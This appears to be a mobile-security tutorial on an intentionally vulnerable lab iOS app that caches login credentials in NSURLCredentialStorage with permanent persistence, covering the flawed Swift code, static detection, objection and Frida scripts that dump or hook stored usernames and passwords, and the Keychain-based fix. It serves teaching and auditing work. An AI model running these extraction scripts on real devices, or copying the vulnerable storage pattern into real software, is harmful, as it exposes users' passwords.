`NSURLCredentialStorage` is the OS-level credential cache for HTTP authentication challenges - Basic, Digest, NTLM. When an app stores credentials there with `.permanent` persistence, iOS writes them to `Library/Credentials/` on the device filesystem. They survive app restart, device reboot, and OS upgrade. Unlike Keychain items, they are not gated by `kSecAttrAccessible`; they live in a SQLite database readable directly on a jailbroken device. Most developers reaching for `NSURLCredentialStorage` are either following an old tutorial or responding to `URLAuthenticationChallenge` without thinking about where the credential ends up.

<br>**The vulnerable pattern**

`StoredCredentialViewController` stores credentials on every successful login with `.permanent` persistence:

```swift
let credential = URLCredential(
    user: email,
    password: password,
    persistence: .permanent)   // writes to disk in Library/Credentials/

let protectionSpace = URLProtectionSpace(
    host: "api.vulnlabapp.example.com",
    port: 443,
    protocol: "https",
    realm: nil,
    authenticationMethod: NSURLAuthenticationMethodHTTPBasic)

URLCredentialStorage.shared.setCredential(credential, for: protectionSpace)
```

`.permanent` is the dangerous flag. `.forSession` keeps the credential in memory only, gone on app exit. `.permanent` serialises it to disk immediately.

<br>**Why it is distinct from Keychain**

Keychain items stored with `SecItemAdd` are encrypted by the Secure Enclave and gated by the `kSecAttrAccessible` level the developer chose. `NSURLCredentialStorage` uses a different backing store - a SQLite file in `Library/Credentials/` under the app sandbox. On a jailbroken device, any process can read that file:

```bash
# On-device path (jailbroken)
cat /var/mobile/Containers/Data/Application/<UUID>/Library/Credentials/
# or via AFC with iMazing / iFunBox
```

`SecItemCopyMatching` will not return these credentials - they are not Keychain items. Tools that only dump Keychain miss them entirely.

<br>**Identifying it statically**

```bash
nm Payload/VulnLabAppiOS.app/VulnLabAppiOS \
  | grep -E 'NSURLAuthenticationMethod|URLCredential|setCredential|CredentialStorage'
```

Any match on `setCredential` or `URLCredentialStorage` is a signal to check the persistence argument. If the binary contains `NSURLAuthenticationMethodHTTPBasic` alongside `setCredential`, the app is doing HTTP Basic auth and caching credentials.

<br>**Dumping credentials via objection**

```bash
objection -g com.vulnlab.iosapp explore
ios nsurlcredentialstorage dump
```

Objection enumerates every entry in `URLCredentialStorage.shared.allCredentials` and prints the host, port, auth method, username, and password. Triggered at runtime after any login flow that reaches the credential store.

<br>**Frida script to enumerate all stored credentials**

```javascript
const CredentialStorage = ObjC.classes.NSURLCredentialStorage;

// allCredentials returns NSDictionary<NSURLProtectionSpace, NSDictionary<NSString, NSURLCredential>>
const all = CredentialStorage['+ sharedCredentialStorage'].call(CredentialStorage)
    .allCredentials();

const spaces = all.allKeys();
for (let i = 0; i < spaces.count(); i++) {
    const space = spaces.objectAtIndex_(i);
    const creds = all.objectForKey_(space);
    const accounts = creds.allKeys();
    for (let j = 0; j < accounts.count(); j++) {
        const account = accounts.objectAtIndex_(j);
        const cred = creds.objectForKey_(account);
        console.log('[NSURLCredentialStorage]');
        console.log('  host=' + space.host() + ':' + space.port());
        console.log('  method=' + space.authenticationMethod());
        console.log('  user=' + cred.user());
        console.log('  pass=' + cred.password());
    }
}
```

Run after triggering any login or authentication flow. The output lists every cached credential the app has stored.

<br>**Hook to catch new entries at runtime**

```javascript
const setCredential = ObjC.classes.NSURLCredentialStorage['- setCredential:forProtectionSpace:'];
Interceptor.attach(setCredential.implementation, {
    onEnter: function(args) {
        const cred  = new ObjC.Object(args[2]);
        const space = new ObjC.Object(args[3]);
        console.log('[setCredential] host=' + space.host());
        console.log('[setCredential] user=' + cred.user());
        console.log('[setCredential] pass=' + cred.password());
        console.log('[setCredential] persistence=' + cred.persistence());
        // persistence: 0=none, 1=session, 2=permanent, 3=synchronized
    }
});
```

`persistence` value `2` is `.permanent`. If you see it, that is the finding.

<br>**The fix**

Replace `.permanent` with `.forSession`:

```swift
let credential = URLCredential(
    user: email,
    password: password,
    persistence: .forSession)   // memory only, gone on app exit
```

If the app needs to re-authenticate automatically on every launch, store the credentials in Keychain with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` instead:

```swift
let query: [CFString: Any] = [
    kSecClass: kSecClassInternetPassword,
    kSecAttrServer: "api.vulnlabapp.example.com",
    kSecAttrAccount: email,
    kSecValueData: password.data(using: .utf8)!,
    kSecAttrAccessible: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
SecItemAdd(query as CFDictionary, nil)
```

Keychain with `WhenUnlockedThisDeviceOnly` is encrypted by the Secure Enclave, excluded from iCloud sync, and not readable from `Library/Credentials/`.

<br>**Closing**

`NSURLCredentialStorage` with `.permanent` is a credential in a cleartext-readable SQLite file. It does not benefit from Keychain encryption. The fix is one enum change. The audit is one `strings` grep and one objection command.

Happy Hacking !!
